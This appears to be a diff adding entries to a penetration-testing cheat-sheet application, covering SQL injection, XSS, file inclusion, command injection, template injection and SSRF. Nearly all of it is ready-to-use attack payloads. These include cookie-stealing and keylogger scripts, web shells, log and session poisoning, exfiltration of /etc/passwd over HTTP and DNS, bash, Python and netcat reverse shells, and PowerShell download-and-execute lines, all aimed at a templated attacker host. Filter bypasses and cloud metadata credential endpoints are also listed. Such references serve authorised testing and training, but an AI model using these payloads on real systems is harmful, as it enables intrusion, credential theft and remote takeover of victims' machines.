+      {l:"Enable + exec",t:"'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--\n'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--\n'; EXEC xp_cmdshell 'whoami';--"},
+      {l:"Stacked query",t:"'; EXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://{{ip}}:{{port}}/shell.ps1'')\"';--"},
+    ],note:"xp_cmdshell is disabled by default. Must enable with sp_configure (needs SA role)."},
+    {name:"PostgreSQL RCE",tags:["sqli","rce"],cmds:[
+      {l:"COPY to file",t:"'; COPY (SELECT '\x3c?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';--"},
+      {l:"Large object",t:"'; CREATE TABLE cmd_exec(cmd_output text);--\n'; COPY cmd_exec FROM PROGRAM 'id';--\n'; SELECT * FROM cmd_exec;--"},
+    ],note:"PostgreSQL COPY FROM PROGRAM executes OS commands directly."},
+  ]},
+],
+
+// ─── XSS ───
+xss:[
+  {section:"Reflected XSS",items:[
+    {name:"Basic XSS Payloads",tags:["xss"],cmds:[
+      {l:"Script alert",t:"\x3cscript>alert(1)\x3c/script>\n\x3cscript>alert(document.cookie)\x3c/script>\n\x3cscript>alert(document.domain)\x3c/script>"},
+      {l:"Event handlers",t:"\x3cimg src=x onerror=alert(1)>\n\x3csvg onload=alert(1)>\n\x3cbody onload=alert(1)>\n\x3cinput onfocus=alert(1) autofocus>\n\x3cmarquee onstart=alert(1)>\n\x3cdetails open ontoggle=alert(1)>"},
+      {l:"Without parens",t:"\x3cimg src=x onerror=alert`1`>\n\x3cimg src=x onerror=confirm`1`>\n\x3cimg src=x onerror=prompt`1`>"},
+    ],note:"Start with \x3cscript>alert(1)\x3c/script>. If blocked, try event handlers."},
+    {name:"XSS Filter Bypass",tags:["xss","waf"],cmds:[
+      {l:"Case bypass",t:"\x3cScRiPt>alert(1)\x3c/ScRiPt>\n\x3cSCRIPT>alert(1)\x3c/SCRIPT>"},
+      {l:"Encoding",t:"\x3cimg src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n\x3ca href=javascript:alert(1)>click\x3c/a>\n\x3ca href=javascript&#58;alert(1)>click\x3c/a>"},
+      {l:"Double encode",t:"%253Cscript%253Ealert(1)%253C%252Fscript%253E\n\x3cimg src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">"},
+      {l:"Null bytes",t:"\x3cscr%00ipt>alert(1)\x3c/scr%00ipt>\n\x3cimg/src=x onerror=alert(1)>"},
+      {l:"No quotes",t:"\x3cimg src=x onerror=alert(String.fromCharCode(88,83,83))>"},
+      {l:"SVG payload",t:"\x3csvg>\x3cscript>alert(1)\x3c/script>\x3c/svg>\n\x3csvg/onload=alert(1)>"},
+    ],note:"Try multiple encoding types. WAFs often miss nested or double encoding."},
+  ]},
+  {section:"Stored XSS",items:[
+    {name:"Cookie Stealing Payloads",tags:["xss"],cmds:[
+      {l:"Fetch exfil",t:"\x3cscript>fetch('http://{{ip}}:{{port}}/?c='+document.cookie)\x3c/script>"},
+      {l:"Image exfil",t:"\x3cscript>new Image().src='http://{{ip}}:{{port}}/?c='+document.cookie;\x3c/script>"},
+      {l:"XHR exfil",t:"\x3cscript>var x=new XMLHttpRequest();x.open('GET','http://{{ip}}:{{port}}/?c='+document.cookie);x.send();\x3c/script>"},
+    ],note:"Start listener: python3 -m http.server {{port}} to capture cookies."},
+    {name:"Session Hijacking",tags:["xss"],cmds:[
+      {l:"Full hijack",t:"\x3cscript>\nvar c=document.cookie;\nvar x=new XMLHttpRequest();\nx.open('POST','http://{{ip}}:{{port}}/steal');\nx.setRequestHeader('Content-Type','application/x-www-form-urlencoded');\nx.send('cookie='+encodeURIComponent(c)+'&url='+encodeURIComponent(window.location));\n\x3c/script>"},
+      {l:"Keylogger",t:"\x3cscript>\ndocument.onkeypress=function(e){\n  new Image().src='http://{{ip}}:{{port}}/?k='+e.key;\n}\n\x3c/script>"},
+    ],note:"Inject into stored fields (comments, profiles) for persistent attacks."},
+  ]},
+  {section:"DOM-Based XSS",items:[
+    {name:"DOM XSS Sources & Sinks",tags:["xss"],cmds:[
+      {l:"Common sources",t:"# Check these DOM properties for user-controlled input:\ndocument.URL\ndocument.documentURI\ndocument.referrer\nlocation.href\nlocation.search\nlocation.hash\nwindow.name"},
+      {l:"URL fragment",t:"# If app uses location.hash:\nhttp://{{target}}/page#\x3cimg src=x onerror=alert(1)>"},
+      {l:"postMessage",t:"# If app uses window.addEventListener('message'):\n\x3ciframe src='http://{{target}}/page' onload=\"this.contentWindow.postMessage('\x3cimg src=x onerror=alert(1)>','*')\">\x3c/iframe>"},
+    ],note:"DOM XSS is client-side only. Look for innerHTML, eval(), document.write() sinks."},
+  ]},
+],
+
+// ─── LFI / RFI ───
+lfi:[
+  {section:"Local File Inclusion (LFI)",items:[
+    {name:"Basic LFI",tags:["lfi"],cmds:[
+      {l:"Linux",t:"http://{{target}}/page.php?file=../../../../etc/passwd\nhttp://{{target}}/page.php?file=../../../../etc/shadow\nhttp://{{target}}/page.php?file=../../../../etc/hosts"},
+      {l:"Windows",t:"http://{{target}}/page.php?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\nhttp://{{target}}/page.php?file=C:\\Windows\\win.ini\nhttp://{{target}}/page.php?file=C:\\inetpub\\wwwroot\\web.config"},
+      {l:"Common params",t:"# Test these parameters for LFI:\n?file= ?page= ?include= ?path= ?doc= ?folder=\n?view= ?content= ?document= ?layout= ?template=\n?lang= ?mod= ?conf="},
+    ],note:"Try with and without extension. Some apps append .php automatically."},
+    {name:"Path Traversal Bypass",tags:["lfi","bypass"],cmds:[
+      {l:"Encoding",t:"..%2f..%2f..%2f..%2fetc/passwd\n..%252f..%252f..%252f..%252fetc/passwd\n%2e%2e%2f%2e%2e%2fetc/passwd\n..%c0%af..%c0%afetc/passwd"},
+      {l:"Null byte",t:"../../../../etc/passwd%00\n../../../../etc/passwd%00.php\n../../../../etc/passwd\\0"},
+      {l:"Double dots",t:"....//....//....//etc/passwd\n..././..././..././etc/passwd\n..;/..;/..;/etc/passwd"},
+      {l:"Absolute",t:"/etc/passwd\n/etc/passwd%00\nfile:///etc/passwd"},
+    ],note:"Null byte works on PHP \x3c5.3.4. Double encoding bypasses single-decode filters."},
+    {name:"Important Files to Read",tags:["lfi"],cmds:[
+      {l:"Linux",t:"/etc/passwd\n/etc/shadow\n/etc/hosts\n/etc/hostname\n/etc/issue\n/proc/self/environ\n/proc/self/cmdline\n/proc/self/fd/0\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/auth.log\n/var/log/syslog\n/home/USER/.ssh/id_rsa\n/home/USER/.bash_history\n/root/.bash_history"},
+      {l:"Windows",t:"C:\\Windows\\win.ini\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\inetpub\\wwwroot\\web.config\nC:\\inetpub\\logs\\LogFiles\nC:\\xampp\\apache\\conf\\httpd.conf\nC:\\xampp\\apache\\logs\\access.log\nC:\\Users\\USER\\.ssh\\id_rsa"},
+      {l:"Web configs",t:"/var/www/html/.htaccess\n/var/www/html/wp-config.php\n/var/www/html/configuration.php\n/var/www/html/config.php\n/var/www/html/.env\n/etc/apache2/apache2.conf\n/etc/nginx/nginx.conf\n/etc/php/X.X/apache2/php.ini"},
+    ],note:"Read source code, configs, SSH keys, credentials. Always try /etc/passwd first."},
+  ]},
+  {section:"PHP Wrappers (LFI to RCE)",items:[
+    {name:"php://filter (Read Source Code)",tags:["lfi","php"],cmds:[
+      {l:"Base64 read",t:"php://filter/convert.base64-encode/resource=index.php\nphp://filter/convert.base64-encode/resource=upload.php\nphp://filter/convert.base64-encode/resource=config.php"},
+      {l:"Full URL",t:"http://{{target}}/page.php?file=php://filter/convert.base64-encode/resource=index.php\n# Decode: echo BASE64_STRING | base64 -d"},
+    ],note:"Most important wrapper. Reads PHP source code as base64 to prevent execution."},
+    {name:"php://input (POST RCE)",tags:["lfi","php","rce"],cmds:[
+      {l:"RCE",t:"# URL: http://{{target}}/page.php?file=php://input\n# POST body:\n\x3c?php system('id'); ?>\n\n# curl:\ncurl -X POST http://{{target}}/page.php?file=php://input -d '\x3c?php system(\"id\"); ?>'"},
+    ],note:"Requires allow_url_include=On. Sends PHP code in POST body."},
+    {name:"data:// wrapper (RCE)",tags:["lfi","php","rce"],cmds:[
+      {l:"Direct",t:"data://text/plain,\x3c?php system('id'); ?>\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"},
+      {l:"Full URL",t:"http://{{target}}/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"},
+    ],note:"Requires allow_url_include=On. Base64 of: \x3c?php system($_GET['cmd']); ?>"},
+    {name:"expect:// wrapper (RCE)",tags:["lfi","php","rce"],cmds:[
+      {l:"Command exec",t:"http://{{target}}/page.php?file=expect://id\nhttp://{{target}}/page.php?file=expect://whoami"},
+    ],note:"Requires expect extension (rare). Direct command execution."},
+    {name:"phar:// wrapper",tags:["lfi","php","rce"],cmds:[
+      {l:"Phar include",t:"http://{{target}}/page.php?file=phar://uploads/shell.jpg/shell.php\n# If you uploaded a phar archive renamed as .jpg"},
+    ],note:"Includes files from within phar archives. Useful for deserialization attacks."},
+  ]},
+  {section:"LFI to RCE Techniques",items:[
+    {name:"Log Poisoning (Apache/Nginx)",tags:["lfi","rce"],cmds:[
+      {l:"Apache access log",t:"# 1. Poison the log:\ncurl http://{{target}}/ -A '\x3c?php system($_GET[\"cmd\"]); ?>'\n\n# 2. Include the log:\nhttp://{{target}}/page.php?file=/var/log/apache2/access.log&cmd=id"},
+      {l:"Apache error log",t:"# 1. Request non-existent page with PHP code:\ncurl 'http://{{target}}/\x3c?php system($_GET[\"cmd\"]); ?>'\n\n# 2. Include error log:\nhttp://{{target}}/page.php?file=/var/log/apache2/error.log&cmd=id"},
+      {l:"Nginx",t:"# Logs: /var/log/nginx/access.log /var/log/nginx/error.log\ncurl http://{{target}}/ -A '\x3c?php system($_GET[\"cmd\"]); ?>'\nhttp://{{target}}/page.php?file=/var/log/nginx/access.log&cmd=id"},
+      {l:"SSH log",t:"# 1. SSH with PHP username:\nssh '\x3c?php system($_GET[\"cmd\"]); ?>'@{{target}}\n\n# 2. Include auth log:\nhttp://{{target}}/page.php?file=/var/log/auth.log&cmd=id"},
+    ],note:"Inject PHP code into logs, then include the log file via LFI."},
+    {name:"LFI via /proc/self/environ",tags:["lfi","rce"],cmds:[
+      {l:"Environ",t:"# 1. Set User-Agent to PHP code:\ncurl http://{{target}}/page.php?file=/proc/self/environ -A '\x3c?php system($_GET[\"cmd\"]); ?>'\n\n# 2. Access with cmd:\nhttp://{{target}}/page.php?file=/proc/self/environ&cmd=id"},
+    ],note:"User-Agent appears in /proc/self/environ. Inject PHP via User-Agent header."},
+    {name:"LFI via PHP Session Files",tags:["lfi","rce"],cmds:[
+      {l:"Session poison",t:"# 1. Find session save path (usually /tmp or /var/lib/php/sessions/)\n# 2. Set a session value containing PHP code:\ncurl http://{{target}}/page.php -b 'PHPSESSID=evil' -d 'username=\x3c?php system($_GET[\"cmd\"]); ?>'\n\n# 3. Include session file:\nhttp://{{target}}/page.php?file=/var/lib/php/sessions/sess_evil&cmd=id\nhttp://{{target}}/page.php?file=/tmp/sess_evil&cmd=id"},
+    ],note:"If app stores user input in session, poison session file then include it."},
+  ]},
+  {section:"Remote File Inclusion (RFI)",items:[
+    {name:"RFI Basic",tags:["lfi","rce"],cmds:[
+      {l:"HTTP",t:"http://{{target}}/page.php?file=http://{{ip}}:{{port}}/shell.php"},
+      {l:"Null byte",t:"http://{{target}}/page.php?file=http://{{ip}}:{{port}}/shell.php%00"},
+      {l:"Double encode",t:"http://{{target}}/page.php?file=http%3A%2F%2F{{ip}}%3A{{port}}%2Fshell.php"},
+    ],note:"Requires allow_url_include=On AND allow_url_fopen=On. Host shell.php on your server."},
+    {name:"RFI via SMB (Windows)",tags:["lfi","rce"],cmds:[
+      {l:"SMB share",t:"http://{{target}}/page.php?file=\\\\{{ip}}\\{{share}}\\shell.php"},
+      {l:"Setup server",t:"impacket-smbserver {{share}} $(pwd) -smb2support"},
+    ],note:"Windows apps can include files via UNC paths (SMB). No allow_url_include needed."},
+  ]},
+  {section:"Advanced LFI Techniques",items:[
+    {name:"PHP Filter Chains (RCE without file write)",tags:["lfi","php","rce"],cmds:[
+      {l:"Concept",t:"# php://filter chains can GENERATE arbitrary PHP code\n# without needing any file write or log poisoning!\n# Tool: php_filter_chain_generator.py\npython3 php_filter_chain_generator.py --chain '\x3c?php system($_GET[\"cmd\"]); ?>'"},
+      {l:"Usage",t:"# The tool outputs a long php://filter/convert chain:\nhttp://{{target}}/page.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|..../resource=php://temp\n# This GENERATES PHP code from thin air via encoding chains\n# Then include it with &cmd=id"},
+      {l:"Get the tool",t:"git clone https://github.com/synacktiv/php_filter_chain_generator\npython3 php_filter_chain_generator.py --chain '\x3c?=system(\"id\")?>'"},
+    ],note:"Most powerful modern LFI technique. Works even with no writable dirs, no logs, no sessions. Just need include() with user input."},
+    {name:"zip:// Wrapper",tags:["lfi","php","rce"],cmds:[
+      {l:"Create + include",t:"# 1. Create zip with PHP shell:\necho '\x3c?php system($_GET[\"cmd\"]); ?>' > shell.php\nzip shell.zip shell.php\nmv shell.zip shell.jpg  # rename to bypass upload filter\n\n# 2. Upload shell.jpg\n# 3. Include via zip:// wrapper:\nhttp://{{target}}/page.php?file=zip://uploads/shell.jpg%23shell.php&cmd=id"},
+    ],note:"zip:// extracts and includes a file from within the archive. %23 is # (fragment). Upload zip as .jpg to bypass filters."},
+    {name:"LFI via /proc/self/fd (Temp File Race)",tags:["lfi","rce"],cmds:[
+      {l:"Technique",t:"# PHP creates temp files in /tmp/php* during file upload\n# Race condition: include the temp file before PHP deletes it\n# 1. Upload file with PHP code in POST body\n# 2. Simultaneously include /proc/self/fd/NUM\n#    where NUM is the file descriptor for the temp file\n# Brute force FDs:\nfor fd in $(seq 0 50); do\n  curl -s \"http://{{target}}/page.php?file=/proc/self/fd/$fd\" | grep -q uid && echo \"FD $fd works\"\ndone"},
+    ],note:"PHP temp files exist briefly during upload. Race condition to include them via /proc/self/fd or /tmp/phpXXXXXX."},
+    {name:"pearcmd.php LFI to RCE",tags:["lfi","php","rce"],cmds:[
+      {l:"Technique",t:"# If pecl/pear is installed, pearcmd.php can write files:\n# Include pearcmd.php with crafted args:\nhttp://{{target}}/page.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/&/\x3c?=system($_GET[0])?>\"+/tmp/shell.php\n# Then include the written shell:\nhttp://{{target}}/page.php?file=/tmp/shell.php&0=id"},
+      {l:"Alternative path",t:"# pearcmd.php common locations:\n/usr/local/lib/php/pearcmd.php\n/usr/share/php/pearcmd.php\n/usr/lib/php/pearcmd.php"},
+    ],note:"Works on Docker PHP images where pear is installed. No logs/sessions needed."},
+    {name:"Path Truncation (Old PHP)",tags:["lfi","bypass"],cmds:[
+      {l:"Null byte",t:"# PHP \x3c 5.3.4 - null byte terminates string:\n../../../../etc/passwd%00\n../../../../etc/passwd%00.php"},
+      {l:"Long path",t:"# PHP \x3c 5.3 - truncation at 4096 chars:\n../../../../etc/passwd/./././././././././[...repeat to 4096 chars]"},
+      {l:"Double encoding",t:"..%252f..%252f..%252f..%252fetc/passwd"},
+    ],note:"Null byte: PHP \x3c5.3.4. Path truncation: PHP \x3c5.3. Double encoding: when app decodes twice."},
+  ]},
+],
+
+// ─── COMMAND INJECTION ───
+cmdi:[
+  {section:"Basic Command Injection",items:[
+    {name:"Command Separators",tags:["rce"],cmds:[
+      {l:"Linux",t:"; id\n| id\n|| id\n& id\n&& id\n$(id)\n`id`\n\\n id"},
+      {l:"Windows",t:"& whoami\n&& whoami\n| whoami\n|| whoami\n; whoami"},
+      {l:"Newline",t:"%0a id\n%0d%0a whoami\n\\n id"},
+    ],note:"Try each separator. Some apps filter certain chars but not others."},
+    {name:"Common Injection Points",tags:["rce"],cmds:[
+      {l:"Input fields",t:"# Test any field that might interact with OS:\nPing: 127.0.0.1; id\nFilename: file.txt; id\nDNS lookup: target.com; id\nUser-Agent: () { :; }; /bin/bash -c 'id'\nReferer: () { :; }; /bin/bash -c 'id'"},
+    ],note:"Look for functionality that runs OS commands: ping, nslookup, file operations."},
+  ]},
+  {section:"Blind Command Injection",items:[
+    {name:"Out-of-Band Detection",tags:["rce"],cmds:[
+      {l:"DNS exfil",t:"; nslookup $(whoami).YOUR_DOMAIN.com\n; host $(id | base64).YOUR_DOMAIN.com\n; curl http://{{ip}}:{{port}}/$(whoami)"},
+      {l:"HTTP callback",t:"; curl http://{{ip}}:{{port}}/$(id|base64)\n; wget http://{{ip}}:{{port}}/$(whoami)"},
+      {l:"Time-based",t:"; sleep 5\n| sleep 5\n`sleep 5`\n$(sleep 5)"},
+    ],note:"Start listener: python3 -m http.server {{port}} to catch callbacks."},
+    {name:"Data Exfiltration",tags:["rce"],cmds:[
+      {l:"Base64 exfil",t:"; curl http://{{ip}}:{{port}}/$(cat /etc/passwd | base64 -w0)"},
+      {l:"File by file",t:"; curl -X POST http://{{ip}}:{{port}}/ -d @/etc/passwd"},
+      {l:"DNS exfil",t:"; for line in $(cat /etc/passwd | base64 -w50 | tr '+' '-'); do nslookup $line.YOUR_DOMAIN; done"},
+    ],note:"When you can't see output, exfiltrate data via HTTP/DNS."},
+  ]},
+  {section:"Command Injection Bypass",items:[
+    {name:"Space Bypass",tags:["rce","bypass"],cmds:[
+      {l:"Alternatives",t:"{cat,/etc/passwd}\ncat${IFS}/etc/passwd\ncat$IFS/etc/passwd\nX=$'cat\\x20/etc/passwd'&&$X\ncat\x3c>/etc/passwd\ncat%09/etc/passwd"},
+    ],note:"$IFS (Internal Field Separator) is the most reliable space bypass."},
+    {name:"Character Filter Bypass",tags:["rce","bypass"],cmds:[
+      {l:"No slashes",t:"# Use environment variables:\n${PATH:0:1}  -> /\n${HOME:0:1}  -> /\n${PWD:0:1}   -> /"},
+      {l:"Base64 bypass",t:"echo d2hvYW1p | base64 -d | sh\necho aWQ= | base64 -d | bash"},
+      {l:"Hex bypass",t:"echo -e '\\x69\\x64' | sh\nprintf '\\x69\\x64' | sh"},
+      {l:"Wildcards",t:"/???/??t /???/p??swd  -> cat /etc/passwd\n/???/??n/w?o??i       -> /usr/bin/whoami"},
+      {l:"Variable concat",t:"a=who;b=ami;$a$b\na=c;b=at;c=' /etc/passwd';$a$b$c"},
+    ],note:"Combine techniques for heavy filtering. Wildcards are very powerful."},
+    {name:"Reverse Shell via CMDi",tags:["rce"],cmds:[
+      {l:"Bash",t:"; bash -i >& /dev/tcp/{{ip}}/{{sport}} 0>&1"},
+      {l:"Python",t:"; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{ip}}\",{{sport}}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"},
+      {l:"Netcat",t:"; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ip}} {{sport}} >/tmp/f"},
+    ],note:"Get interactive shell after confirming command injection."},
+  ]},
+  {section:"Windows Command Injection",items:[
+    {name:"Windows Separators",tags:["rce"],cmds:[
+      {l:"Separators",t:"& whoami\n&& whoami\n| whoami\n|| whoami\n%0a whoami\n\n# Windows doesn't support $() or backticks like Linux\n# But PowerShell does:\n; whoami\n$(whoami)"},
+      {l:"PowerShell",t:"# If input reaches PowerShell:\n; whoami\n| whoami\n$(whoami)\n& whoami\n; IEX(New-Object Net.WebClient).DownloadString('http://{{ip}}:{{port}}/shell.ps1')"},
+    ],note:"Windows CMD uses & | && || for chaining. PowerShell adds ; $() syntax."},
+    {name:"Windows Bypass Techniques",tags:["rce","bypass"],cmds:[
+      {l:"Caret escape",t:"# ^ escapes next char in CMD:\nwh^oami\npo^wer^she^ll\nn^et u^ser\n# Bypasses basic keyword filters"},
+      {l:"Env var splice",t:"# Use env vars to build commands:\nset a=who&&set b=ami&&%a%%b%\n# Or in PowerShell:\n$a='who';$b='ami';iex \"$a$b\""},
+      {l:"Comspec trick",t:"%COMSPEC% /c whoami\ncmd /c \"whoami\""},
+    ],note:"^ is CMD's escape character. Environment variable splicing bypasses keyword filters."},
+  ]},
+  {section:"Argument Injection",items:[
+    {name:"Argument / Flag Injection",tags:["rce"],cmds:[
+      {l:"Git injection",t:"# If app runs: git clone USER_INPUT\n# Inject: --upload-pack='id'\n# Or: -c protocol.ext.allow=always\n\n# Tar wildcard:\n# If app runs: tar czf backup.tar.gz *\n# Create files named:\ntouch './--checkpoint=1'\ntouch './--checkpoint-action=exec=sh shell.sh'"},
+      {l:"Rsync injection",t:"# If app runs: rsync USER_INPUT dest/\n# Inject: -e 'sh -c id' src\n# Or create file: --rsh=sh -c id"},
+      {l:"Curl injection",t:"# If app runs: curl USER_INPUT\n# Inject: -o /var/www/html/shell.php http://{{ip}}:{{port}}/shell.php\n# Or: -T /etc/passwd http://{{ip}}:{{port}}/"},
+      {l:"Find / exec",t:"# If app runs: find . -name USER_INPUT\n# Inject: * -exec id \\;\n# Or: -name x -or -exec id ;"},
+    ],note:"When user input becomes a CLI argument (not a command). Inject flags like -o, -e, --exec to change behavior."},
+  ]},
+],
+
+// ─── SSTI ───
+ssti:[
+  {section:"Detection & Identification",items:[
+    {name:"SSTI Detection Payloads",tags:["ssti"],cmds:[
+      {l:"Math test",t:"{{7*7}}\n${7*7}\n#{7*7}\n\x3c%= 7*7 %>\n{{7*'7'}}\n${{7*7}}\n@(7*7)"},
+      {l:"Decision tree",t:"# If {{7*7}} = 49 -> Jinja2/Twig\n# If {{7*'7'}} = 7777777 -> Jinja2 (Python)\n# If {{7*'7'}} = 49 -> Twig (PHP)\n# If ${7*7} = 49 -> Freemarker/Velocity/Thymeleaf\n# If #{7*7} = 49 -> Ruby ERB\n# If \x3c%= 7*7 %> = 49 -> ERB/EJS"},
+    ],note:"Start with {{7*7}}. If 49 appears in response, SSTI confirmed. Then identify engine."},
+  ]},
+  {section:"Jinja2 (Python/Flask)",items:[
+    {name:"Jinja2 RCE Payloads",tags:["ssti","rce"],cmds:[
+      {l:"Basic RCE",t:"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"},
+      {l:"MRO chain",t:"{{ ''.__class__.__mro__[1].__subclasses__() }}\n# Find subprocess.Popen (usually index ~400+)\n{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0] }}"},
+      {l:"Config leak",t:"{{ config }}\n{{ config.items() }}\n{{ self.__dict__ }}\n{{ request.environ }}"},
+      {l:"Compact RCE",t:"{{ namespace.__init__.__globals__.os.popen('id').read() }}\n{{ lipsum.__globals__.os.popen('id').read() }}"},
+      {l:"Reverse shell",t:"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/{{ip}}/{{sport}} 0>&1\"').read() }}"},
+    ],note:"Jinja2 is in Flask/Django. The MRO chain finds subclasses for code execution."},
+  ]},
+  {section:"Twig (PHP)",items:[
+    {name:"Twig RCE Payloads",tags:["ssti","rce"],cmds:[
+      {l:"Twig 1.x",t:"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"},
+      {l:"Twig 3.x",t:"{{['id']|filter('system')}}\n{{['cat /etc/passwd']|filter('system')}}"},
+      {l:"File read",t:"{{'/etc/passwd'|file_excerpt(0,100)}}"},
+    ],note:"Twig is the main PHP template engine (Symfony/Laravel)."},
+  ]},
+  {section:"Other Template Engines",items:[
+    {name:"Freemarker (Java)",tags:["ssti","rce"],cmds:[
+      {l:"RCE",t:"\x3c#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}"},
+    ],note:"Used in Java/Spring applications."},
+    {name:"Velocity (Java)",tags:["ssti","rce"],cmds:[
+      {l:"RCE",t:"#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('id'))##\n$ex.waitFor()\n#set($out=$ex.getInputStream())##\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"},
+    ],note:"Apache Velocity - found in Java apps."},
+    {name:"ERB (Ruby)",tags:["ssti","rce"],cmds:[
+      {l:"RCE",t:"\x3c%= system('id') %>\n\x3c%= `id` %>\n\x3c%= IO.popen('id').read %>"},
+    ],note:"Ruby ERB template engine. Backticks execute commands."},
+    {name:"Pebble (Java)",tags:["ssti","rce"],cmds:[
+      {l:"RCE",t:"{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}"},
+    ],note:"Pebble Java template engine."},
+    {name:"Handlebars (Node.js)",tags:["ssti","rce"],cmds:[
+      {l:"RCE",t:"{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}"},
+    ],note:"Node.js Handlebars template injection."},
+  ]},
+  {section:"More Template Engines",items:[
+    {name:"Smarty (PHP)",tags:["ssti","rce"],cmds:[
+      {l:"RCE",t:"{system('id')}\n{php}echo `id`;{/php}\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"\\x3c?php passthru($_GET['cmd']); ?>\",self::clearConfig())}"},
+      {l:"File read",t:"{fetch file='/etc/passwd'}"},
+    ],note:"Smarty is common in PHP CMS. {php} tags may be disabled in Smarty 3+."},
+    {name:"Thymeleaf (Java/Spring)",tags:["ssti","rce"],cmds:[
+      {l:"Expression",t:"${T(java.lang.Runtime).getRuntime().exec('id')}"},
+      {l:"SpEL injection",t:"__${T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"id\"})}__::.x"},
+      {l:"Preprocessor",t:"__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()}__::.x"},
+    ],note:"Thymeleaf uses Spring Expression Language (SpEL). Very common in Spring Boot apps."},
+    {name:"Mako (Python)",tags:["ssti","rce"],cmds:[
+      {l:"RCE",t:"${__import__('os').popen('id').read()}\n\x3c% import os %>${os.popen('id').read()}"},
+    ],note:"Mako is Python template engine used in Pylons, Pyramid frameworks."},
+    {name:"EL Injection (Java)",tags:["ssti","rce"],cmds:[
+      {l:"JSP EL",t:"${Runtime.getRuntime().exec('id')}\n${applicationScope}\n${sessionScope}"},
+      {l:"Spring EL",t:"${T(java.lang.System).getenv()}\n${T(java.lang.Runtime).getRuntime().exec('id')}"},
+    ],note:"Expression Language injection in JSP/JSF/Spring. Look for ${} or #{} in Java apps."},
+  ]},
+  {section:"SSTI Filter Bypass",items:[
+    {name:"Jinja2 Filter Bypass",tags:["ssti","bypass"],cmds:[
+      {l:"No dots",t:"# When . is blocked:\n{{ config['__class__']['__init__']['__globals__']['os']['popen']('id')['read']() }}\n# Using |attr filter:\n{{ ''|attr('__class__')|attr('__mro__')|last }}"},
+      {l:"No underscores",t:"# When _ is blocked:\n{{ config|attr(request.args.a) }}&a=__class__\n# Or hex:\n{{ ''|attr('\\x5f\\x5fclass\\x5f\\x5f') }}"},
+      {l:"No brackets",t:"# When [] is blocked:\n{{ config.__class__.__init__.__globals__.os.popen('id').read() }}\n# Everything via dot notation"},
+      {l:"No quotes",t:"# When quotes are blocked:\n{{ config|attr(request.args.x) }}&x=__class__\n# Use request.args, request.cookies, request.headers to pass strings"},
+    ],note:"When WAF blocks _, ., [], or quotes - use |attr() filter, request.args, or hex encoding."},
+  ]},
+],
+
+// ─── SSRF ───
+ssrf:[
+  {section:"Basic SSRF",items:[
+    {name:"Internal Service Access",tags:["ssrf"],cmds:[
+      {l:"Localhost",t:"http://127.0.0.1\nhttp://localhost\nhttp://0.0.0.0\nhttp://[::1]\nhttp://0177.0.0.1 (octal)\nhttp://2130706433 (decimal)\nhttp://0x7f000001 (hex)"},
+      {l:"Internal IPs",t:"http://10.0.0.1\nhttp://172.16.0.1\nhttp://192.168.1.1\nhttp://169.254.169.254 (cloud metadata)"},
+      {l:"Common ports",t:"http://127.0.0.1:22 (SSH banner)\nhttp://127.0.0.1:6379 (Redis)\nhttp://127.0.0.1:3306 (MySQL)\nhttp://127.0.0.1:8080 (internal web)\nhttp://127.0.0.1:9200 (Elasticsearch)"},
+    ],note:"SSRF accesses internal services. Test in URL params, webhooks, image fetchers."},
+    {name:"Cloud Metadata Endpoints",tags:["ssrf"],cmds:[
+      {l:"AWS",t:"http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data"},
+      {l:"GCP",t:"http://metadata.google.internal/computeMetadata/v1/\nhttp://169.254.169.254/computeMetadata/v1/"},
+      {l:"Azure",t:"http://169.254.169.254/metadata/instance?api-version=2021-02-01\nhttp://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"},
